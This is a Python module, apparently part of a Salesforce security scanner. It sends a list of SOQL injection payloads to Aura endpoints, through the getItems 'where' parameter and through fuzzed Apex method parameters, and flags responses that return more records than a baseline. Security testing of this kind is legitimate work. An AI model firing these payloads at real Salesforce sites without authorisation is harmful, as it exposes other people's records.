# Built-in imports
import json
import os

# Third-party imports
from loguru import logger

# Local imports
from ..client import AuraClient

# SOQL injection payloads — ordered from least to most aggressive.
# Detection strategy: if the injected query returns more records than the
# baseline (or a structurally different response), it is injectable.
SOQL_PAYLOADS: list[str] = [
    "' OR Id != null AND Name != '",
    "' OR '1'='1",
    "test%' LIKE '%",
    "' OR Name LIKE '%",
    "'; SELECT Id FROM User WHERE Name != '",
]

# Generic Apex method parameter names to fuzz.
_PARAM_NAMES = ["query", "search", "filter", "name", "keyword", "value", "input", "q"]

_GET_ITEMS_DESCRIPTOR = (
    "serviceComponent://ui.force.components.controllers.lists"
    ".selectableListDataProvider.SelectableListDataProviderController"
    "/ACTION$getItems"
)


def _get_items_payload(entity: str, where: str | None = None) -> dict:
    params: dict = {
        "entityNameOrId": entity,
        "layoutType": "FULL",
        "pageSize": 5,
        "currentPage": 0,
        "useTimeout": False,
        "getCount": True,
        "enableRowActions": False,
    }
    if where is not None:
        params["where"] = where
    return {
        "actions": [{
            "id": "inj;a",
            "descriptor": _GET_ITEMS_DESCRIPTOR,
            "callingDescriptor": "UNKNOWN",
            "params": params,
        }]
    }


def _apex_payload(descriptor: str, param_name: str, param_value: str) -> dict:
    return {
        "actions": [{
            "id": "inj;b",
            "descriptor": descriptor,
            "callingDescriptor": "UNKNOWN",
            "params": {param_name: param_value},
        }]
    }


def _count(resp: dict) -> int | None:
    try:
        rv = resp["actions"][0].get("returnValue") or {}
        return rv.get("totalCount") or len(rv.get("result", []))
    except (IndexError, KeyError):
        return None


def _state(resp: dict) -> str:
    try:
        return resp["actions"][0].get("state", "")
    except (IndexError, KeyError):
        return ""


def probe_getitems(
    client: AuraClient,
    object_name: str,
) -> list[dict]:
    """
    Test SOQL injection via the getItems `where` parameter.
    Compares baseline record count against injected queries.
    """
    findings: list[dict] = []

    baseline_resp = client.aura_post(_get_items_payload(object_name))
    baseline_count = _count(baseline_resp)
    if baseline_count is None:
        logger.debug(f"{object_name}: baseline failed, skipping injection probe")
        return findings

    logger.debug(f"{object_name}: baseline count={baseline_count}")

    for payload in SOQL_PAYLOADS:
        try:
            resp = client.aura_post(_get_items_payload(object_name, where=payload))
            injected_count = _count(resp)
            state = _state(resp)

            if injected_count is not None and injected_count > baseline_count:
                finding = {
                    "object": object_name,
                    "vector": "getItems.where",
                    "payload": payload,
                    "baseline_count": baseline_count,
                    "injected_count": injected_count,
                }
                logger.warning(
                    f"SOQL injection: {object_name} via where clause: "
                    f"baseline={baseline_count} → injected={injected_count} "
                    f"(payload: {payload!r})"
                )
                findings.append(finding)
                break  # One confirmation is enough per object
            else:
                logger.debug(
                    f"{object_name} | {payload!r} → count={injected_count} state={state}"
                )
        except Exception:
            logger.exception(f"{object_name} injection probe error")

    return findings


def probe_apex(
    client: AuraClient,
    descriptors: list[str],
) -> list[dict]:
    """
    For each Apex descriptor from apex-fuzz hits, test SOQL payloads
    against common parameter names. Flags anything that returns SUCCESS
    with a SOQL payload (may indicate unsanitised input handling).
    """
    findings: list[dict] = []

    for descriptor in descriptors:
        for param in _PARAM_NAMES:
            for payload in SOQL_PAYLOADS:
                try:
                    resp = client.aura_post(_apex_payload(descriptor, param, payload))
                    actions = resp.get("actions", [])
                    if not actions:
                        continue
                    state = actions[0].get("state", "")
                    if state == "SUCCESS":
                        finding = {
                            "descriptor": descriptor,
                            "param": param,
                            "payload": payload,
                        }
                        logger.warning(
                            f"Apex SOQL candidate: {descriptor} "
                            f"param={param!r} payload={payload!r} → SUCCESS"
                        )
                        findings.append(finding)
                except Exception:
                    logger.exception("Apex injection probe error")

    return findings


def run(
    client: AuraClient,
    objects: dict[str, str],
    apex_hits: list[str],
    output_dir: str,
) -> dict:
    """
    Run all injection probes: getItems where-clause and Apex method params.
    Saves findings to injection_findings.json.
    """
    all_findings: list[dict] = []

    logger.info(f"SOQL injection probe: testing {len(objects)} object(s) via getItems")
    for obj_name in objects:
        all_findings.extend(probe_getitems(client, obj_name))

    if apex_hits:
        logger.info(f"SOQL injection probe: testing {len(apex_hits)} Apex descriptor(s)")
        all_findings.extend(probe_apex(client, apex_hits))

    if all_findings:
        logger.warning(f"{len(all_findings)} potential injection finding(s) found")
    else:
        logger.success("No SOQL injection indicators found.")

    os.makedirs(output_dir, exist_ok=True)
    path = os.path.join(output_dir, "injection_findings.json")
    with open(path, "w", encoding="utf-8") as fh:
        fh.write(json.dumps(all_findings, ensure_ascii=False, indent=2))
    logger.info(f"Injection findings saved → {path}")

    return {"findings": all_findings}
